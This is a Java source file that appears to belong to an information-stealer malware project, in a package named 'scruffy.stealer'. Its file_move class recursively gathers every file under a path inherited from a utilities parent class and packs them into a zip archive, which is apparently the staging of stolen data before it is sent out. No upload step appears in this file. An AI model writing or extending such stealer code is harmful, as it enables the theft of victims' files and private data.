package scruffy.stealer.file;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.util.ArrayList;
import java.util.List;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;

import scruffy.stealer.utils.utilities;

public class file_move extends utilities {

    public void initialize() throws Exception {
        List<File> list = new ArrayList<>();
        
        listFilesRecursively(new File(getPath()), list);
        writeFilesToZip(new File(getPath()), list);
    }

    private void listFilesRecursively(File listDirectory, List<File> list) {
        for (File file : listDirectory.listFiles()) {
            if (file.isDirectory()) 
            	listFilesRecursively(file, list);
            
            else list.add(file);
        }
    }

    private void writeFilesToZip(File dir, List<File> list) throws Exception {
    	FileOutputStream fos = new FileOutputStream(getPath() + ".zip");
    	ZipOutputStream zos = new ZipOutputStream(fos);

    	list.stream().filter(file -> !file.isDirectory())
	    	.forEach(file -> {
	    		try {
	    			addFileToZip(dir, file, zos);
	    		} catch (Exception ignored) {}
	    	});
    }

    private void addFileToZip(File directoryToZip, File file, ZipOutputStream zos) throws Exception {
        FileInputStream inputStream = new FileInputStream(file);
        
        String path = file.getCanonicalPath().substring(directoryToZip.getCanonicalPath().length() + 1);
        ZipEntry entry = new ZipEntry(path);
        zos.putNextEntry(entry);

        int length;
        byte[] bytes = new byte[1024];
        while ((length = inputStream.read(bytes)) >= 0) {
            zos.write(bytes, 0, length);
        }
        zos.closeEntry();
	}

}